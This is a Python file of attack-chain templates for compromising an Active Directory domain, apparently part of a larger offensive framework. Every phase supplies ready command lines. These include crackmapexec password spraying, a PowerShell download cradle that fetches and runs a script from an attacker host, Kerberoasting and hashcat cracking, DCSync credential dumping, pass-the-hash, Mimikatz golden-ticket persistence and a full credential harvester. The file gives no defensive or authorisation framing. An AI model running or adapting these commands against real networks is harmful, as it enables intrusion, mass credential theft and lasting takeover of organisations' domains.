"""
Domain/Active Directory Compromise Templates
"""


class DomainTemplates:
    """Templates for domain and Active Directory compromise"""
    
    @staticmethod
    def domain_compromise_chain():
        """
        Complete attack chain for Active Directory compromise
        Target: Windows domain environments
        """
        return {
            'name': 'Domain Compromise',
            'description': 'Complete attack chain for compromising Active Directory domain',
            'target_type': 'active_directory',
            'difficulty': 'high',
            'estimated_time': '4-8 hours',
            'phases': [
                DomainTemplates._domain_recon_phase(),
                DomainTemplates._initial_access_phase(),
                DomainTemplates._privilege_escalation_phase(),
                DomainTemplates._domain_takeover_phase()
            ]
        }
    
    @staticmethod
    def _domain_recon_phase():
        """Domain reconnaissance phase"""
        return {
            'phase': 'reconnaissance',
            'name': 'Active Directory Reconnaissance',
            'description': 'Enumerate domain structure and identify targets',
            'steps': [
                {
                    'step': 1,
                    'name': 'User Enumeration',
                    'tool': '01-reconnaissance/email_hunter.py',
                    'command': 'python3 01-reconnaissance/email_hunter.py {target_domain} "{company_name}"',
                    'expected_output': 'List of email addresses and usernames',
                    'success_criteria': 'Found valid domain users',
                    'required_vars': ['target_domain', 'company_name']
                },
                {
                    'step': 2,
                    'name': 'SMB Enumeration',
                    'tool': 'enum4linux/crackmapexec',
                    'command': 'crackmapexec smb {target_ip} -u "" -p "" --shares',
                    'expected_output': 'SMB shares and information',
                    'success_criteria': 'Identified accessible shares',
                    'required_vars': ['target_ip']
                },
                {
                    'step': 3,
                    'name': 'LDAP Enumeration',
                    'tool': 'ldapsearch',
                    'command': 'ldapsearch -x -h {target_ip} -b "dc={domain_component},dc={domain_component2}"',
                    'expected_output': 'Domain structure information',
                    'success_criteria': 'Enumerated domain users and groups',
                    'required_vars': ['target_ip', 'domain_component', 'domain_component2']
                }
            ]
        }
    
    @staticmethod
    def _initial_access_phase():
        """Initial access to domain"""
        return {
            'phase': 'initial_access',
            'name': 'Domain Initial Access',
            'description': 'Gain initial foothold in domain environment',
            'steps': [
                {
                    'step': 1,
                    'name': 'Password Spraying',
                    'tool': 'crackmapexec',
                    'command': 'crackmapexec smb {target_ip} -u users.txt -p "Password123" --continue-on-success',
                    'expected_output': 'Valid credentials',
                    'success_criteria': 'Found at least one valid account',
                    'required_vars': ['target_ip']
                },
                {
                    'step': 2,
                    'name': 'Phishing Campaign',
                    'tool': '03-delivery/phishing_framework.py',
                    'command': 'python3 03-delivery/phishing_framework.py --template office365 --targets domain_users.txt',
                    'expected_output': 'Credentials or shell callback',
                    'success_criteria': 'User clicked link and provided credentials',
                    'required_vars': [],
                    'notes': 'Manual campaign execution required'
                },
                {
                    'step': 3,
                    'name': 'Deploy Initial Payload',
                    'tool': '02-weaponization/payload_generator.py',
                    'command': 'python3 02-weaponization/payload_generator.py {attacker_ip} {attacker_port}',
                    'expected_output': 'Reverse shell payload',
                    'success_criteria': 'Payload generated and ready for delivery',
                    'required_vars': ['attacker_ip', 'attacker_port']
                }
            ]
        }
    
    @staticmethod
    def _privilege_escalation_phase():
        """Privilege escalation phase"""
        return {
            'phase': 'privilege_escalation',
            'name': 'Domain Privilege Escalation',
            'description': 'Escalate privileges to domain admin',
            'steps': [
                {
                    'step': 1,
                    'name': 'Local Privilege Escalation',
                    'tool': 'WinPEAS/PowerUp',
                    'command': 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{attacker_ip}/PowerUp.ps1\'); Invoke-AllChecks"',
                    'expected_output': 'Privilege escalation vectors',
                    'success_criteria': 'Identified exploitable misconfigurations',
                    'required_vars': ['attacker_ip']
                },
                {
                    'step': 2,
                    'name': 'Kerberoasting',
                    'tool': 'Rubeus/Impacket',
                    'command': 'python3 GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request',
                    'expected_output': 'Service account TGS tickets',
                    'success_criteria': 'Obtained crackable service tickets',
                    'required_vars': ['domain', 'username', 'password', 'dc_ip']
                },
                {
                    'step': 3,
                    'name': 'Crack Service Tickets',
                    'tool': 'hashcat/john',
                    'command': 'hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt',
                    'expected_output': 'Cracked passwords',
                    'success_criteria': 'Recovered service account password',
                    'required_vars': [],
                    'notes': 'Run offline on attacking machine'
                }
            ]
        }
    
    @staticmethod
    def _domain_takeover_phase():
        """Domain takeover phase"""
        return {
            'phase': 'domain_takeover',
            'name': 'Domain Administrative Access',
            'description': 'Achieve domain admin and extract sensitive data',
            'steps': [
                {
                    'step': 1,
                    'name': 'DCSync Attack',
                    'tool': 'Mimikatz/Impacket',
                    'command': 'python3 secretsdump.py {domain}/{username}:{password}@{dc_ip}',
                    'expected_output': 'NTLM hashes for all domain accounts',
                    'success_criteria': 'Extracted domain administrator hash',
                    'required_vars': ['domain', 'username', 'password', 'dc_ip']
                },
                {
                    'step': 2,
                    'name': 'Pass-the-Hash',
                    'tool': 'crackmapexec',
                    'command': 'crackmapexec smb {target_ip} -u Administrator -H {ntlm_hash}',
                    'expected_output': 'Administrative access',
                    'success_criteria': 'Authenticated as domain admin',
                    'required_vars': ['target_ip', 'ntlm_hash']
                },
                {
                    'step': 3,
                    'name': 'Golden Ticket Creation',
                    'tool': 'Mimikatz',
                    'command': 'kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /ptt',
                    'expected_output': 'Golden ticket injected',
                    'success_criteria': 'Persistent domain admin access established',
                    'required_vars': ['domain', 'domain_sid', 'krbtgt_hash'],
                    'notes': 'Run on Windows system with Mimikatz'
                },
                {
                    'step': 4,
                    'name': 'Dump All Credentials',
                    'tool': '05-post-exploitation/credential_harvester.py',
                    'command': 'python3 05-post-exploitation/credential_harvester.py --full',
                    'expected_output': 'All domain credentials',
                    'success_criteria': 'Complete credential database extracted',
                    'required_vars': []
                }
            ]
        }